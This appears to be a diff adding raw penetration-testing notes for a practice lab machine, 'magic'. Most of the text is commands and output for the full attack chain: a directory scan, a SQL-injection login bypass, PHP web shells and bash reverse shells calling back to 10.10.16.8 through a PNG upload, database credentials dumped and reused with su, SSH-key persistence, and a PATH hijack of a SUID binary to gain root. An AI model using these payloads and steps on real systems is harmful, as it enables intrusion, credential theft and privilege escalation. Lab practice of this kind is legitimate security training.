@@ -1,0 +1,209 @@
+└─$ sudo dirsearch -u http://10.10.10.185
+[sudo] password for ed: 
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/ed/tools/reports/http_10.10.10.185/_25-10-30_19-42-10.txt
+
+Target: http://10.10.10.185/
+
+[19:42:10] Starting: 
+[19:42:30] 403 -  277B  - /archive.sql
+[19:42:30] 403 -  277B  - /assets/
+[19:42:30] 301 -  313B  - /assets  ->  http://10.10.10.185/assets/
+[19:42:42] 403 -  277B  - /images/
+[19:42:42] 301 -  313B  - /images  ->  http://10.10.10.185/images/
+[19:42:43] 403 -  277B  - /index.shtml
+[19:42:43] 403 -  277B  - /install.sql
+[19:42:45] 403 -  277B  - /localhost.sql
+[19:42:45] 403 -  277B  - /log.sqlite
+[19:42:46] 200 -    1KB - /login.php
+[19:42:46] 403 -  277B  - /login.shtml
+[19:42:46] 302 -    0B  - /logout.php  ->  index.php
+[19:42:46] 403 -  277B  - /logs.sqlite
+[19:42:46] 403 -  277B  - /ltmain.sh
+[19:43:03] 302 -    3KB - /upload.php  ->  login.php
+[19:43:04] 403 -  277B  - /upload.shtm
+
+
+//port 80, thelogin page ,basic SQLi works, 'or1=1# as user. but chromuim not worked, only firefox.
+
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.8/443 0>&1'"); ?>
+//here web comnnad for php, we must add bash -c at first. 
+//way 1, set a revershell payload in the png file
+
+//way 2, set a cmd page in the png file, and use bach -c to run a reverseshell
+<?php system($_GET[cmd]); ?>
+bash -c 'bash -i >%26 /dev/tcp/10.10.16.8/8821 0>%261'
+
+
+
+└─$ nc -nvlp 443             
+listening on [any] 443 ...
+connect to [10.10.16.8] from (UNKNOWN) [10.10.10.185] 57482
+bash: cannot set terminal process group (1197): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@magic:/var/www/Magic/images/uploads$   
+
+www-data@magic:/var/www/Magic$ less db.php5
+less db.php5
+<?php
+class Database
+{
+    private static $dbName = 'Magic' ;
+    private static $dbHost = 'localhost' ;
+    private static $dbUsername = 'theseus';
+    private static $dbUserPassword = 'iamkingtheseus';
+
+└─$ ssh theseus@10.10.10.185                  
+theseus@10.10.10.185: Permission denied (publickey).
+                                                                                                    
+┌──(ed㉿kali)-[~]
+└─$ nmap -p 22 --script ssh-auth-methods 10.10.10.185
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-31 15:45 AEDT
+Nmap scan report for 10.10.10.185
+Host is up (0.081s latency).
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+| ssh-auth-methods: 
+|   Supported authentication methods: 
+|_    publickey
+
+Nmap done: 1 IP address (1 host up) scanned in 8.28 seconds
+
+
+$ mysqldump -h localhost -u theseus -p Magic
+mysqldump -h localhost -u theseus -p Magic
+Enter password: iamkingtheseus
+
+-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
+--
+-- Host: localhost    Database: Magic
+-- ------------------------------------------------------
+-- Server version	5.7.29-0ubuntu0.18.04.1
+
+/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
+/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
+/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
+/*!40101 SET NAMES utf8 */;
+/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
+/*!40103 SET TIME_ZONE='+00:00' */;
+/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
+/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
+/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
+/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
+
+--
+-- Table structure for table `login`
+--
+
+DROP TABLE IF EXISTS `login`;
+/*!40101 SET @saved_cs_client     = @@character_set_client */;
+/*!40101 SET character_set_client = utf8 */;
+CREATE TABLE `login` (
+  `id` int(6) NOT NULL AUTO_INCREMENT,
+  `username` varchar(50) NOT NULL,
+  `password` varchar(100) NOT NULL,
+  PRIMARY KEY (`id`),
+  UNIQUE KEY `username` (`username`)
+) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
+/*!40101 SET character_set_client = @saved_cs_client */;
+
+--
+-- Dumping data for table `login`
+--
+
+LOCK TABLES `login` WRITE;
+/*!40000 ALTER TABLE `login` DISABLE KEYS */;
+INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
+/*!40000 ALTER TABLE `login` ENABLE KEYS */;
+UNLOCK TABLES;
+/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
+
+/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
+/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
+/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
+/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
+/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
+/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
+/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES *
+
+www-data@magic:/var/www/Magic/images/uploads$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+$ su theseus 
+su theseus 
+Password: Th3s3usW4sK1ng
+
+theseus@magic:/var/www/Magic$ 
+
+-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo
+
+
+strings sysinfo
+
+popen() failed!
+====================Hardware Info====================
+lshw -short
+====================Disk Info====================
+fdisk -l
+====================CPU Info====================
+cat /proc/cpuinfo
+====================MEM Usage=====================
+free -h
+;*3$"
+zPLR
+
+theseus@magic:~/.ssh$ ssh-keygen -t rsa
+
+theseus@magic:~/.ssh$ ls
+ls
+id_rsa  id_rsa.pub
+
+theseus@magic:~/.ssh$ cp id_rsa.pub authorized_keys
+cp id_rsa.pub authorized_keys
+theseus@magic:~/.ssh$ ls
+ls
+authorized_keys  id_rsa  id_rsa.pub
+
+└─$ ssh theseus@10.10.10.185  -i id_rsa
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.3.0-42-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+theseus@magic:~$ id
+uid=1000(theseus) gid=1000(theseus) groups=1000(theseus),100(users)
+
+theseus@magic:/tmp$ chmod 777 lshw 
+theseus@magic:/tmp$ export PATH=/tmp:$PATH
+theseus@magic:/tmp$ echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+
+theseus@magic:/tmp$ echo "/bin/bash" > lshw
+theseus@magic:/tmp$ /bin/sysinfo
+====================Hardware Info====================
+root@magic:/tmp# id
+root@magic:/tmp# whoami
+root@magic:/tmp# cd /root
+root@magic:/root# cat root.txt
+root@magic:/root# /bin/bash -i >& /dev/tcp/10.10.16.8/8821 0>&1
+
+//or we can use EOF to edit multiply lines of script
+root@magic:/tmp# cat << EOF > lshw
+cat << EOF > lshw
+> #!/bin/bash
+#!/bin/bash
+> /bin/bash -i >& /dev/tcp/10.10.16.8/8822 0>&1
+/bin/bash -i >& /dev/tcp/10.10.16.8/8822 0>&1
+> chmod +x lshw
+chmod +x lshw
+> EOF
+EOF
+
